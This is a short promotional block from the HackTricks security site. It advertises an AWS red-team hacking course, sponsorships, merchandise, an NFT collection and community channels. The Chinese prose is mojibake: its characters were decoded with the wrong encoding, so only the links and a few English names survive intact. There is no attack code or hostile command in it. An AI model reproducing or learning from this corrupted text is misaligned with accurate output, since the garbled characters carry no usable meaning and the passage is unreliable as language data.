<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
